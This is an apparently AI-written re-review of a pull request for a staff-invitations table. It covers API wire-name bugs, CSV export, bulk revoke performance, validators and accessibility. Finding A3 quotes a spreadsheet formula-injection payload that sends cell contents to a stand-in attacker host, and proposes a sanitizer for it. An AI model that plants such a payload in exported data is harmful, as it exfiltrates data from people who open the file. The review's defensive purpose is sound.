# PR #400 — Consolidated review findings (v2 — re-review after GPT-pass)

**Branch:** `feat/280-staff-invitations-table-upgrade` @ `2e1f938eb`
**Diff (now):** +2225 / −213 across 30 files (was +879 / −148 / 9 files at v1)
**Reviewers (this round):** own targeted re-review of every v1 finding + new code in the second-pass commits
**Date:** 2026-05-09

---

## What changed since the v1 review

The other GPT instance landed substantial improvements:

- **Backend bulk-revoke endpoint** (`POST /staff/invitations/bulk-revoke`) replacing the client-side fan-out — biggest architectural win. Resolves B1 and B13 simultaneously.
- **Frontend split into 6 sub-modules** (`staff-invitation-status.ts`, `staff-invitations-toolbar-filters`, `…-selection-actions`, `…-bulk-revoke-dialog`, `…-export-action`, `use-staff-invitation-bulk-revoke`) — much cleaner.
- **Backend tests added** (`FindStaffInvitations.Spec.cs` +318, `BulkRevokeStaffInvitations.Spec.cs` +229, `FindInvitationsForTenantAsStaff.Spec.cs` +28).
- **TS client + OpenAPI spec regenerated** — generated artifacts now in PR.
- **i18n keys added** — 10 new keys in both `common.en.json` and `common.fr.json`. All `defaultValue` props removed from the table file.
- **EmailCell now wraps the email itself in the Link** (B9 resolved).
- **Row icon-only IconButtons now carry explicit `aria-label`** (C5 resolved).
- **Validator rejects empty CSVs** (`,`, `,,,` are now 422) — partial B5 fix.
- **`lodash/uniqBy` duplicate removed** in `optimize-deps.ts` (B14 resolved; `lodash/uniq` still listed — see N-section below).

Scoreboard at a glance:

| v1 ID | Status        | Notes |
|-------|---------------|-------|
| A1    | **Still open**| Wire-name `Status` (PascalCase) — see below |
| A2    | Resolved-with-bug | Client regenerated, but A1 baked-in |
| A3    | **Still open**| `buildCsv()` quotes only; no formula-injection neutralizer |
| A4    | **Still open**| Query still sends `filterStates.status` raw |
| B1    | **Resolved**  | Single bulk endpoint, no client loop |
| B2    | **Still open (repo-wide)** | URL→state sync effect; 8 list-page tables affected |
| B3    | **Resolved**  | All keys present in en/fr |
| B4    | **Resolved**  | `getFailureMessage(failure, { fallback })` in place |
| B5    | **Still open (repo-wide)** | Mid-string empty tokens; tighten across all CSV-enum validators (same set as B6) |
| B6    | **Still open (repo-wide)** | `nameof(...)` + lowercase-at-display; audit all CSV-enum validators |
| B7    | **Still open (repo-wide)** | Disabled `MenuItem` wrapped in `Tooltip > Box span`; 3+ selection-actions affected |
| B8    | Partial       | 4 tests added; 6+ scenarios still uncovered (see B8) |
| B9    | **Resolved**  | Email is the Link target |
| B11   | Won't fix     | Decision: keep current line lengths |
| B12   | **Still open (repo-wide)** | `sortId` → `sort_id`; 11 Find handlers affected |
| B13   | **Resolved**  | Single backend bulk call |
| B14   | **Resolved**  | Duplicate removed |
| C1    | Still open    | Set rebuilt every parse |
| C2    | Still open    | CSV headers hardcoded English |
| C3    | Still open    | Disabled XLSX tab gives no reason |
| C4    | Still open    | Export dialog still no aria wiring |
| C5    | **Resolved**  | aria-label on every row IconButton |
| C6    | Still open    | `732px` magic number unchanged |
| C7    | Still open    | Args record still positional vs sister object-init |
| C8    | Still open    | Local `hasNextPage` redefinition |
| C9    | Still open    | `dataTable` useMemo dep over-broad |
| C10   | Still open    | Unknown status silently maps to `pending` |
| C11   | Won't fix     | Decision: shape mismatch justifies the naming difference |
| C12   | Won't fix     | Decision: explicit naming preferred |
| C14   | Still open    | CSV filename collisions |

Plus 9 **new findings** (N1–N9) coming from the second-pass code that didn't exist at v1. Numbered to avoid colliding with v1 IDs.

---

## A. BLOCKING (would fail review or breaks contract)

### A1. Wire-name `Status` is PascalCase instead of `status` *(unchanged)*

**File:** `apps/api/Src/Modules/Invitations/Handlers/Staff/FindStaffInvitations.cs:18`

```csharp
[FromQuery] public string? Status { get; set; }     // wire-name still "Status"
```

The TS client was regenerated (`packages/client-ts/src/staff/invitations/index.ts`) and now bakes the bug in:

```ts
// line 83
export const InvitationsRequestBuilderUriTemplate =
  "{+baseurl}/staff/invitations{?Status*,cursor*,limit*,sort_id*,sort_order*}";
                                  ^^^^^^^ PascalCase — odd-one-out vs sort_id/sort_order

// line 90
const InvitationsRequestBuilderGetQueryParametersMapper: Record<string, string> = {
    "sortId": "sort_id",
    "sortOrder": "sort_order",
    "status": "Status",   // ← maps lowercase symbol to PascalCase wire-name
};
```

Sister `FindInvitationsForTenantAsStaff.cs:21` is correct (`[FromQuery(Name = "status")]`). `project-conventions.md` + `api-route-parameters.md` mandate snake_case/lowercase wire names.

**Fix:** add `[FromQuery(Name = "status")]`, then `just build-api && just generate-client && just tsc-front`, commit.

**Apply:** **YES — must fix before merge.**

---

### A3. CSV export vulnerable to spreadsheet formula injection (CWE-1236) *(unchanged)*

**File:** `apps/front/src/lib/export/csv.ts:1-14`

The shared `escapeCsvCell` only quotes and escapes embedded quotes:

```ts
const escapeCsvCell = (value) => {
    const normalizedValue = value == null ? '' : String(value);
    return `"${normalizedValue.replaceAll('"', '""')}"`;
};
```

No neutralization for cells starting with `=`, `+`, `-`, `@`, or tab. An attacker creates an invitation with email `=HYPERLINK("http://attacker/?c="&A1,"win")` → opens the CSV in Excel/Sheets → exfiltration.

**Fix:** centralize the sanitizer in `escapeCsvCell` (the natural site since it owns quoting):

```ts
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r'];
const normalize = (raw: string) =>
  FORMULA_PREFIXES.includes(raw[0] ?? '') ? `'${raw}` : raw;
```

Repo-wide policy fix. Every CSV export immediately becomes safer.

**Apply:** **YES** — single shared helper, low blast radius, fixes risk for *all* CSV exports.

---

### A4. UI-validated status diverges from URL value sent to API *(unchanged)*

**File:** `staff-invitations-table.tsx:248-255`, `staff-invitation-status.ts:15-31`

```tsx
// query passes raw URL value
const invitationsQuery = useFindStaffInvitations({
    variables: {
        ...
        status: filterStates.status || undefined,   // raw, not normalized
    },
});
```

`parseStatusFilter` filters out invalid tokens for the *UI checkbox state* but not the request:

- `?status=Pending,bogus,accepted` → UI shows only "accepted" selected; backend returns 422 for `bogus`.
- `?status=Pending` → UI shows nothing selected; backend (case-insensitive validator) returns rows.
- `?status=pending,pending,pending` → backend tolerates duplicates; UI shows "pending" selected once.

**Fix:** normalize once at the source:

```tsx
const normalizedStatus = parseStatusFilter(filterStates.status).join(',');
// pass normalizedStatus to the query
// optionally rewrite the URL on mismatch:
useEffect(() => {
  if (normalizedStatus !== filterStates.status) {
    void setFilterStates({ status: normalizedStatus });
  }
}, [normalizedStatus, filterStates.status, setFilterStates]);
```

**Apply:** **YES.**

---

## B. IMPORTANT (robustness, perf, rules, UX)

### B2. URL-driven filter change does not reset cursor *(unchanged)*

**File:** `staff-invitations-table.tsx:241-246`

```tsx
useEffect(() => {
    const nextStatusFilter = parseStatusFilter(filterStates.status);
    if (!isEqual(nextStatusFilter, statusFilter)) {
        setStatusFilter(nextStatusFilter);
        // ❌ missing resetCursorPagination?.()
    }
}, [filterStates.status, statusFilter]);
```

`handleStatusChange` (line 365-374) does call `resetCursorPagination` ✓, but the URL→state sync path doesn't. Browser back/forward, `Ctrl+L`-edits, or external links pair a stale cursor with a new filter. `list-pages-search-filter-cursor-pagination.md` requires *every* filter change to reset cursor history.

**Fix:** add `resetCursorPagination?.()` inside the effect.

**Apply:** **YES — repo-wide (one-liner per surface).**

**Repo-wide candidates** — 8 list pages combine cursor pagination with `useQueryStates` URL-backed filters:

- `apps/front/src/routes/authed/staff/invitations/list/_parts/staff-invitations-table.tsx` *(this PR)*
- `apps/front/src/routes/authed/staff/staff-users/list/_parts/use-staff-users-table-controller.impl.tsx`
- `apps/front/src/routes/authed/staff/profiles/details/users/_parts/staff-profile-users-table.tsx`
- `apps/front/src/routes/authed/staff/profiles/list/_parts/staff-profiles-table.tsx`
- `apps/front/src/routes/authed/staff/tenants/details/users/_parts/tenant-users-table.tsx`
- `apps/front/src/routes/authed/staff/tenants/details/invitations/_parts/tenant-invitations-table.tsx`
- `apps/front/src/routes/authed/staff/tenant-users/details/_parts/tenant-user-companies-table.tsx`
- `apps/front/src/routes/authed/staff/tenants/list/_parts/tenants-table.tsx`

For each: any URL→state sync effect must call `resetCursorPagination?.()` when the URL value changes externally (back/forward, deep link).

---

### B5. Mid-string empty tokens still tolerated *(partial — minor improvement opportunity)*

**File:** `FindStaffInvitations.cs:60-71` — current code:

```csharp
.Must(raw => {
    if (string.IsNullOrWhiteSpace(raw)) {
        return true;
    }
    var parts = raw
        .Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
    return parts.Length > 0 && parts.All(AllowedStatuses.Contains);
})
```

Behaviour matrix:

| Input             | Result    | Note                                      |
|-------------------|-----------|-------------------------------------------|
| `null` / `""` / `"   "` | accepted (no filter) | ✓ |
| `","`             | 422       | ✓ fixed in `b6ebff5ce5`                  |
| `",,,"`           | 422       | ✓ fixed                                   |
| `"  ,  "`         | 422       | ✓ fixed                                   |
| `"pending,,accepted"` | accepted  | mid-string empties silently dropped       |
| `"pending,bogus"` | 422       | ✓                                         |

The `pending,,accepted` case is borderline. Functionally fine, but a strict reading of the validator's intent says the input is malformed. The cost of tightening is one line (split *without* `RemoveEmptyEntries` for the validation pass).

**Apply:** **YES — repo-wide.** Per user direction, tighten every CSV-enum validator so mid-string empty tokens (e.g. `pending,,accepted`) become 422 rather than silently accepted. Same candidate set as B6 — use the grep recipes documented there.

---

### B6. Validation error message is PascalCase + unstable order *(unchanged — but reframed)*

**File:** `FindStaffInvitations.cs:48-57, 70`

`nameof(...)` is intentional (rename-safe, single source of truth — keep it). The actual problem is just that the enum members are PascalCase while the wire contract is lowercase, so the user-facing error message is wrong:

- Returned to clients today: `"Invalid status value. Must be comma-separated: Pending,Accepted,Expired,Revoked"` (PascalCase, **unstable order** because `HashSet` enumeration is not guaranteed).
- `validator-conventions.md` Rule 8 example uses lowercase tokens; per `project-conventions.md`, wire tokens are lowercase end-to-end.

**Fix (recommended — Option 1):** keep `nameof()` as source of truth, lowercase once at static init for the display string only:

```csharp
private static readonly string[] AllowedStatuses = [
    nameof(InvitationEffectiveStatus.Pending),
    nameof(InvitationEffectiveStatus.Accepted),
    nameof(InvitationEffectiveStatus.Expired),
    nameof(InvitationEffectiveStatus.Revoked),
];

private static readonly HashSet<string> AllowedStatusSet =
    new(AllowedStatuses, StringComparer.OrdinalIgnoreCase);

private static readonly string AllowedStatusesDisplay =
    string.Join(", ", AllowedStatuses.Select(s => s.ToLowerInvariant()).Order());

// validator:
.Must(raw => {
    if (string.IsNullOrWhiteSpace(raw)) return true;
    var parts = raw.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
    return parts.Length > 0 && parts.All(AllowedStatusSet.Contains);
})
.WithMessage($"Status must be one of: {AllowedStatusesDisplay}");
```

Comparison stays `OrdinalIgnoreCase` (no `ToLower` in the hot path), the single `ToLowerInvariant()` runs once at type init for display — *not* a "comparison/dispatch strategy" per AGENTS.md, just canonicalization.

**Alternative (Option 2):** drop the allowlist, reuse the existing `Invitation.ParseEffectiveStatus(part)`:

```csharp
.Must(raw => {
    if (string.IsNullOrWhiteSpace(raw)) return true;
    var parts = raw.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
    return parts.Length > 0 && parts.All(p => Invitation.ParseEffectiveStatus(p) is not null);
})
```

More DRY (validator and `GetStatusesOrNull()` share one parser), at a small allocation cost per validation. Auto-picks-up new enum variants — only safe if the service's where-clause is also exhaustive.

**Alternative (Option 3):** replace the explicit `nameof` list with `Enum.GetNames<InvitationEffectiveStatus>()`. Less to maintain but loses the "force a deliberate decision" property when adding new enum variants.

Sister handler `FindInvitationsForTenantAsStaff.cs` has the same issue. **Repo-wide audit needed:** any other CSV-enum validators using the pre-2026-05 pattern (hardcoded lowercase literals or `nameof(...)` leaking PascalCase to the validation message) must also be migrated to the canonical pattern documented in `docs/guides/validator-conventions.md` Rule 8 (commit `640fa8565`).

To find candidates:

```bash
# Validators with hardcoded string-array allowlists
grep -rn "StringComparer.OrdinalIgnoreCase" apps/api/Src/Modules/ --include="*.cs"

# Validators that join the allowlist into a comma-separated message
grep -rn 'WithMessage.*string.Join' apps/api/Src/Modules/ --include="*.cs"
```

**Apply:** **YES — Option 1, repo-wide.**

---

### B7. Disabled bulk-revoke `MenuItem` still wrapped in `Tooltip > Box span` *(unchanged)*

**File:** `staff-invitations-selection-actions.tsx:65-89`

```tsx
<Tooltip ...>
    <Box component="span">
        <MenuItem
            disabled={eligibleBulkRevokeCount === 0}
            ...
        >
            ...
        </MenuItem>
    </Box>
</Tooltip>
```

MUI `Menu` expects `MenuItem` as direct children for keyboard navigation and ARIA traversal. Wrapping breaks `aria-activedescendant` flow.

**Fix patterns:**

- **Option A (recommended):** hide the item entirely when the eligible-count is 0. The "More actions" trigger is the disambiguation surface; once the menu is open you don't need disabled rows.
- **Option B:** keep `MenuItem` direct, render the disabled reason as a small `Typography` line in the menu (after the disabled item) instead of via Tooltip.

**Apply:** **YES — repo-wide (Option A).**

**Repo-wide candidates** — selection-actions wrapping a disabled `MenuItem` in `Tooltip > Box span`:

- `apps/front/src/routes/authed/staff/invitations/list/_parts/staff-invitations-selection-actions.tsx` *(this PR)*
- `apps/front/src/routes/authed/staff/staff-users/list/_parts/staff-users-selection-actions.tsx`
- `apps/front/src/routes/authed/staff/tenants/details/profiles/_parts/tenant-profiles-selection-actions.tsx`

Audit any other `*-selection-actions.tsx` for the same pattern at implementation time (grep regex: `Tooltip[\s\S]{0,200}<Box component="span"[\s\S]{0,80}<MenuItem`).

---

### B8. Backend integration coverage is incomplete *(partial — 4 of ~10 scenarios)*

**Files:** `FindStaffInvitations.Spec.cs` (+318), `BulkRevokeStaffInvitations.Spec.cs` (+229)

**Find spec covers:**

- `ItShouldReturnUnprocessableEntityWhenStatusCsvHasNoTokens` ✓
- `ItShouldFilterByMultipleStaffInvitationStatuses` (pending+revoked) ✓
- `ItShouldFilterByExpiredStaffInvitationStatus` ✓
- `ItShouldAcceptCommaSeparatedStaffInvitationStatusesWithSpaces` ✓

**Find spec missing:**

- single-status filter (covered indirectly but not as a discrete test)
- all-statuses filter
- invalid non-empty token (`?status=foo` → 422)
- duplicate values (`?status=pending,pending` → accepted, no extra rows)
- mixed-case input (`?status=Pending,Accepted` → accepted, case-insensitive)
- invalid `sort_id` → 400
- invalid cursor → 400
- pagination across `nextCursor` + filter

**Bulk-revoke spec covers:**

- `ItShouldReturnValidationProblemForMalformedBulkRevokeBody` ✓
- `ItShouldReturnPartialSuccessWhenBulkRevokingMixedTargets` (pending + accepted + missing) ✓

**Bulk-revoke spec missing:**

- happy path (all pending → all revoked, succeededCount/failedCount=0)
- empty array (validator should reject)
- duplicate IDs (handler does `.Distinct()` — should succeed once)
- maxCount limit (101 items → 422)
- already-revoked invitation (what reason code? — service maps to NotFound)
- expired invitation (currently revoked, since `RevokeInvitationForStaffAsync` doesn't check expiry)
- auth: tenant user → 403
- auth: unauthenticated → 401
- audit-log content (right user/action/target)

**Apply:** **PUNT or fast-follow** — current coverage is "good enough to ship" but not the full matrix.

---

### ~~B11. C# 100-char line-length violations~~ *(won't fix — user decision)*

Decision: keep current line lengths. Handler signature (`FindStaffInvitations.cs:75`, 117 chars) and service predicate (`InvitationService.cs:695-698`, ~115-125 chars per line) remain as-is.

---

### B12. Error message exposes camelCase wire name `sortId` *(unchanged)*

**File:** `FindStaffInvitations.cs:117`

```csharp
$"Invalid sortId: {sortIdError.SortId}. Allowed values: created_at, expires_at, email, accepted_at"
```

URL contract is `sort_id`.

**Apply:** **YES — repo-wide.**

**Repo-wide candidates** — 11 Find handlers leak `sortId` to clients:

- `apps/api/Src/Modules/SystemNotices/Handlers/Staff/FindSystemNotices.cs:71`
- `apps/api/Src/Modules/AuditLogs/Handlers/Staff/FindAuditLogs.cs:157`
- `apps/api/Src/Modules/Invitations/Handlers/Staff/FindStaffInvitations.cs:117` *(this PR)*
- `apps/api/Src/Modules/Invitations/Handlers/Staff/FindInvitationsForTenantAsStaff.cs:138`
- `apps/api/Src/Modules/Tenants/Handlers/Staff/FindTenantsAsStaff.cs:144`
- `apps/api/Src/Modules/Profiles/Handlers/Staff/FindStaffProfiles.cs:79`
- `apps/api/Src/Modules/Profiles/Handlers/Staff/FindStaffProfileUsers.cs:104`
- `apps/api/Src/Modules/Profiles/Handlers/Staff/FindTenantProfilesAsStaff.cs:89`
- `apps/api/Src/Modules/Users/Handlers/Staff/FindStaffUser.cs:139`
- `apps/api/Src/Modules/Users/Handlers/Staff/FindTenantUserCompaniesForStaff.cs:144`
- `apps/api/Src/Modules/Users/Handlers/Staff/FindTenantUsersAsStaff.cs:180`

For each: replace `sortId` with `sort_id` in the user-facing error message (the wire param name).

---

## N. New findings introduced by the second-pass commits

### N1. Bulk-revoke service does N×SELECT + N×SaveChanges instead of one batched query

**File:** `apps/api/Src/Modules/Invitations/Services/InvitationService.cs:451-484`

```csharp
foreach (var invitationId in requestedInvitationIds) {
    RevokeInvitationForStaffResult result =
        await RevokeInvitationForStaffAsync(invitationId, cancellationToken);
    ...
}
```

`RevokeInvitationForStaffAsync` (line 437-449) does its own `FirstOrDefaultAsync` + an internal `SaveChangesAsync`. With 100 invitations: 100 SELECT round-trips + 100 UPDATE round-trips. At ~1ms per round-trip on Postgres + network, that's >200ms minimum, likely 400-800ms in practice.

**Fix sketch:**

```csharp
public async Task<BulkStaffInvitationActionResult> BulkRevokeStaffInvitationsAsync(
    IReadOnlyCollection<Guid> invitationIds,
    CancellationToken cancellationToken = default
) {
    var requestedIds = invitationIds.Distinct().ToList();

    // 1. Single SELECT for all candidates (scope-filtered).
    var rows = await _dbContext.Invitation
        .Where(inv => requestedIds.Contains(inv.Id) && inv.Scope == InvitationScope.Staff)
        .ToListAsync(cancellationToken);

    var foundById = rows.ToDictionary(inv => inv.Id);
    var failedItems = new List<BulkStaffInvitationActionFailedItem>();
    var succeededCount = 0;

    foreach (var id in requestedIds) {
        if (!foundById.TryGetValue(id, out var inv)) {
            failedItems.Add(new(id, BulkStaffInvitationActionFailureReasons.NotFound));
            continue;
        }
        if (inv.Status == InvitationStatus.Accepted) {
            failedItems.Add(new(id, BulkStaffInvitationActionFailureReasons.AlreadyAccepted));
            continue;
        }
        // EF tracker mutates in-memory; one SaveChanges flushes them all.
        inv.Status = InvitationStatus.Revoked;
        succeededCount++;
    }

    // 2. Single SaveChanges for all updated rows.
    await _dbContext.SaveChangesAsync(cancellationToken);

    return new BulkStaffInvitationActionResult(
        SucceededCount: succeededCount,
        FailedCount: failedItems.Count,
        FailedItems: failedItems
    );
}
```

Goes from `2N+0` round-trips to `2` total. At N=100: ~800ms → ~10ms.

**Caveat:** the existing `RevokeInvitationForStaffAsync` may carry side-effects (token invalidation, etc.) that the per-row loop relied on. Audit before swapping. If side-effects exist, refactor them into a private helper that operates on a tracked entity and call it inside the loop instead of going through the public per-row method.

**Apply:** **YES — repo-wide, perf-critical.**

**Repo-wide candidates** — every bulk service method potentially using N×SELECT + N×SaveChanges:

- `BulkRevokeStaffInvitationsAsync` *(this PR)* — `apps/api/Src/Modules/Invitations/Services/InvitationService.cs:451-484`
- `BulkSuspendStaffUsersAsync`
- `BulkReactivateStaffUsersAsync`
- `BulkDeleteStaffUsersAsync`
- `BulkDeleteStaffProfilesAsync`
- `BulkDeleteTenantProfilesAsStaffAsync`
- The two bulk methods in `TenantUserCompanyActionsForStaff` (add + remove company associations)

For each: audit the implementation; if it loops a per-item public method, convert to single batched query + classification + single `SaveChangesAsync`. Watch for hidden side-effects on the per-item method (token invalidation, downstream events, audit-log calls).

---

### N2. Audit log loop is also sequential — batch in one insert

**File:** `apps/api/Src/Modules/Invitations/Handlers/Staff/BulkRevokeStaffInvitations.cs:75-84`

```csharp
foreach (var invitationId in succeededInvitationIds) {
    await auditLogService.LogAsync(
        new CreateAuditLogArgs(
            UserId: account.UserId,
            Action: AuditActions.InvitationRevoked,
            TargetId: invitationId
        ),
        cancellationToken
    );
}
```

100 succeeded items → 100 sequential audit-log inserts. ~100ms+ added to the response for free.

**Fix:** add a batched method on `IAuditLogService` (e.g. `LogManyAsync(IReadOnlyCollection<CreateAuditLogArgs>, CancellationToken)`) that does a single `AddRangeAsync` + `SaveChangesAsync`. Then:

```csharp
try {
    await auditLogService.LogManyAsync(
        succeededInvitationIds.Select(id => new CreateAuditLogArgs(
            UserId: account.UserId,
            Action: AuditActions.InvitationRevoked,
            TargetId: id
        )).ToList(),
        cancellationToken
    );
} catch (Exception ex) {
    // Audit logging is observability — never fail the response over it.
    _logger.LogError(ex, "Failed to write audit logs for bulk revoke");
}
```

**This subsumes N3.** The try/catch wraps the single batched call instead of needing per-item handling. Net effect:

- Performance: 100 round-trips → 1.
- Robustness: previously a mid-loop failure left the response 500 with N revocations already committed and partial audit trail (per N3). Now: revocations and audit logs are independent — audit-log failure never bubbles up to the user.

**Apply:** **YES — repo-wide, perf + robustness in one.** Once `LogManyAsync` lands on `IAuditLogService`, audit every bulk handler that loops `auditLogService.LogAsync(...)` per success and migrate. Same candidate set as N1's bulk handlers (search `apps/api/Src/Modules/*/Handlers/Staff/Bulk*.cs` and `TenantUserCompanyActionsForStaff.cs`). Same payoff per surface: 1 round-trip instead of N, audit-log failures isolated from the response.

---

### ~~N3. Audit-log failure leaves bulk revoke half-logged~~ *(subsumed by N2)*

The batched `LogManyAsync` + try/catch wrapper proposed in N2 covers this — see N2.

---

### N4. The handler builds `requestedInvitationIds` (distinct) but passes the non-distinct list to the service

**File:** `BulkRevokeStaffInvitations.cs:62-67`

```csharp
var invitationIds = body.GetInvitationIds();
var requestedInvitationIds = invitationIds.Distinct().ToList();
var result = await invitationService.BulkRevokeStaffInvitationsAsync(
    invitationIds,    // ← passes non-distinct
    cancellationToken
);
```

The service internally also calls `.Distinct()` (line 455) so functionally correct, but redundant. Pass `requestedInvitationIds` to avoid the second dedup pass and keep the service's contract clearer.

**Apply:** **YES — repo-wide (small).** Audit every bulk handler under `apps/api/Src/Modules/*/Handlers/Staff/Bulk*.cs` and `TenantUserCompanyActionsForStaff.cs` for the same `Distinct() then pass non-distinct` redundancy. One-character fix per occurrence.

---

### N5. Frontend hook wraps mutation + post-processing in one big try, calls `closeDialog()` twice on certain paths

**File:** `apps/front/src/routes/authed/staff/invitations/list/_parts/use-staff-invitation-bulk-revoke.ts:37-103`

```ts
try {
    const result = await bulkRevokeStaffInvitations(...);   // mutation
    ...
    closeDialog();       // line 56 — fires after mutation success
    ...                  // selection reconciliation, toasts
} catch (error) {
    ...
    closeDialog();       // line 100 — fires on any throw, including post-processing
    toast.error(message);
}
```

If the mutation succeeds but a subsequent line throws (`setRowSelection`, `queryClient.invalidateQueries`), the catch fires and the user gets an `error` toast even though the bulk-revoke was actually applied. Also `closeDialog()` is idempotent so the double call is harmless, just untidy.

**Fix:** extract the mutation into its own `try/catch` and put post-processing outside:

```ts
let result;
try {
    result = await bulkRevokeStaffInvitations({ invitationIds });
} catch (error) {
    closeDialog();
    toast.error(getFailureMessage(toApiFailure(error), { fallback: t('invitation-bulk-revoke-failure') }));
    return;
}
// post-processing on result
```

**Apply:** **YES — repo-wide.**

**Repo-wide candidates** — every bulk-action hook that wraps mutation + post-processing in a single try/catch:

- `apps/front/src/routes/authed/staff/invitations/list/_parts/use-staff-invitation-bulk-revoke.ts:37-103` *(this PR)*
- Audit other bulk-action hooks (likely under `apps/front/src/routes/authed/staff/**/use-*bulk*.ts` and inline hooks inside `*-bulk-action-dialogs.tsx` / `*-selection-actions.tsx` for staff-users, tenant-profiles, tenant-user-companies, etc.)

For each, split try/catch so post-processing runs only on guaranteed-successful mutation.

---

### N6. Frontend doesn't surface backend bulk-action `maxCount: 100` — repo-wide

**Symptom:** if the user selects more than the backend's hard cap and clicks the bulk action, they get a 422 at submission time. The UI doesn't pre-validate, doesn't show a limit, doesn't disable the trigger.

#### Affected backend endpoints (all hardcode `maxCount: 100`)

| Handler | Location |
|---|---|
| `BulkRevokeStaffInvitations` | `apps/api/Src/Modules/Invitations/Handlers/Staff/BulkRevokeStaffInvitations.cs:40` *(this PR)* |
| `BulkSuspendStaffUsers` | `apps/api/Src/Modules/Users/Handlers/Staff/BulkSuspendStaffUsers.cs:40` |
| `BulkReactivateStaffUsers` | `apps/api/Src/Modules/Users/Handlers/Staff/BulkReactivateStaffUsers.cs:40` |
| `BulkDeleteStaffUsers` | `apps/api/Src/Modules/Users/Handlers/Staff/BulkDeleteStaffUsers.cs:40` |
| `BulkDeleteStaffProfiles` | `apps/api/Src/Modules/Profiles/Handlers/Staff/BulkDeleteStaffProfiles.cs:40` |
| `BulkDeleteTenantProfilesAsStaff` | `apps/api/Src/Modules/Profiles/Handlers/Staff/BulkDeleteTenantProfilesAsStaff.cs:42` |
| `TenantUserCompanyActionsForStaff` (×2: add + remove) | `apps/api/Src/Modules/Users/Handlers/Staff/TenantUserCompanyActionsForStaff.cs:47, 78` |

**Separate case:** `BulkCreateStaffInvitations.cs:94` uses `AppEnvironment.Instance.MAX_BULK_INVITATIONS_SIZE` (env-driven, not hardcoded). Out of scope for the same constant — but its UI should still surface a limit. Track separately or align as a follow-up.

#### Recommended fix

1. **Add a shared constant** in `packages/shared-ts/lib/constants.ts`:

   ```ts
   /** Max items per bulk staff/tenant action. Mirrors C# validator `maxCount: 100`. */
   export const BULK_ACTION_MAX_COUNT = 100;
   ```

2. **Audit frontend bulk surfaces** for every affected endpoint. Known candidates (from grep on `selectedCount`/`eligibleBulk*`):

   - `apps/front/src/routes/authed/staff/invitations/list/_parts/staff-invitations-selection-actions.tsx` *(this PR)*
   - `apps/front/src/routes/authed/staff/staff-users/list/_parts/staff-users-bulk-action-dialogs.tsx` (suspend/reactivate/delete)
   - `apps/front/src/routes/authed/staff/tenant-users/details/_parts/tenant-user-companies-selection-actions.tsx` (add/remove company)
   - `apps/front/src/routes/authed/staff/tenants/details/profiles/_parts/tenant-profiles-selection-actions.tsx` (delete tenant profiles)
   - Staff profiles bulk-delete trigger — locate via `useBulk*StaffProfile*` hook usage; may not have a selection-actions file yet.

3. **Per surface:**
   - Disable the bulk action trigger (MenuItem / button) when `eligibleCount > BULK_ACTION_MAX_COUNT`.
   - Tooltip / helper text explaining the limit, e.g. `t('bulk-action-max-count-exceeded', { max: BULK_ACTION_MAX_COUNT, count: eligibleCount })` — add the i18n key in en/fr.
   - Optional: show a counter chip near the trigger when count is between, say, 90 and 100 ("nearing limit").

4. **C# duplication note:** the `100` literal is repeated in 7+ validators. Consider lifting to a shared constant on the C# side too (e.g. `BulkActionLimits.MaxItems`) so the contract is documented in code. Keep TS and C# values in sync via a comment on both sides referencing each other.

**Apply:** **YES — repo-wide, this PR.**

---

### ~~N7. Inconsistency: bulk-create uses raw `fetch`, bulk-revoke uses Kiota client~~ *(won't fix — user decision)*

The Kiota limitation is real: bulk-create's nested body shape (`{ invitations: [{ email, profileIds: [...] }, ...] }`) isn't supported by the Kiota client, hence the raw `fetch`. Bulk-revoke's flat `{ invitationIds: [string, ...] }` body works through `createUntypedArray + createUntypedString`. The comment at `staff-invitation.hooks.ts:100` is accurate.

---

### ~~N8. PR scope creep: 2 unrelated staff tables touched~~ *(won't fix — user decision)*

`staff-profile-users-table.tsx` (-1) and `use-staff-users-table-controller.impl.tsx` (-1) from `2e1f938eb refactor(front): simplify link styles in staff tables`. Acknowledged as part of the broader link-style cleanup; no action needed.

---

### N9. New helper `parseStatusFilter` rebuilds the validation Set on every call

**File:** `apps/front/src/routes/authed/staff/invitations/list/_parts/staff-invitation-status.ts:15-31`

```ts
export const parseStatusFilter = (value: string): StaffInvitationStatus[] => {
    if (!value) return [];

    const valid = new Set<string>(STAFF_INVITATION_STATUS_VALUES);   // ← per-call allocation
    const statuses: StaffInvitationStatus[] = [];

    for (const part of value.split(',')) {
        const status = part.trim();
        if (valid.has(status)) {
            statuses.push(status as StaffInvitationStatus);
        }
    }

    return statuses;
};
```

Same as v1's C1 but in the new dedicated module. Hoist:

```ts
const STAFF_INVITATION_STATUS_VALUE_SET = new Set<string>(STAFF_INVITATION_STATUS_VALUES);
```

**Apply:** **NIT.**

---

## C. NIT (style, polish — same set as v1, minus C5 which is resolved)

### C1 → moved into N9 above (same finding, new file location)

### C2. CSV headers — localize via `t(...)`

**File:** `staff-invitations-export-dialog-controller.tsx:58-66`

**Decision:** translate. Reuse the same keys the table column headers use so CSV/UI stay aligned:

```tsx
const headers = [
    t('email'),                  // matches column at staff-invitations-table.tsx:131
    t('profiles'),               // matches column at :136
    t('status'),                 // matches column at :142
    t('staff-invited-by'),       // matches column at :148
    t('expiry-date'),            // matches column at :155
    t('accepted-at'),            // matches column at :161
    t('created-at'),             // matches column at :167
];
```

All 7 keys already exist in `common.{en,fr}.json`.

**Apply:** **YES — repo-wide.** Walk every export dialog and translate CSV headers using the same `t(...)` keys as the matching table column headers:

- `staff-invitations-export-dialog-controller.tsx` *(this PR)*
- `staff-users-export-dialog-controller.tsx`
- `staff-profiles-export-dialog-controller.tsx`
- `staff-profile-users-export-dialog-controller.tsx`
- `tenant-invitations-export-dialog-controller.tsx`
- `tenant-profiles-export-dialog-controller.tsx`
- `tenant-user-companies-export-dialog-controller.tsx`

Per dialog, look up the matching table file's `useMemo`-built column header keys and reuse them.

### C3. Disabled XLSX tab gives no reason — align to existing repo pattern

**File:** `staff-invitations-export-dialog-controller.tsx:155`

Today the Tab is hard-disabled. The repo already has a better, established pattern at `apps/front/src/routes/authed/staff/staff-users/list/_parts/staff-users-export-dialog-controller.tsx:153-163`:

```tsx
<Tabs ...>
    <Tab label="CSV" value="csv" />
    <Tab label="JSON" value="json" />
    <Tab label="XLSX" value="xlsx" />     {/* selectable */}
</Tabs>
<Typography variant="body2" color="text.secondary" sx={{ minHeight: 20 }}>
    {exportFormat === 'xlsx' ? t('xlsx-export-coming-soon') : ' '}
